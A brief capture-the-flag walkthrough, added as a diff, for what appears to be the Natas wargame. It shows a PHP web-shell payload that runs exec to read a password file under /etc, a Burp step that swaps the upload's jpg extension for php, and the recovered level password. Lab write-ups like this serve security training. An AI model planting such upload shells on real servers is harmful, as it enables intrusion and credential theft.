@@ -1,0 +1,11 @@
+input a php file that has the following code,
+
+<?  
+echo exec('cat /etc/natas_webpass/natas12');
+?> 
+
+next intercept the request with burp and change the jpg to php
+
+Then click the link and navigate to the php file.
+
+pass is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
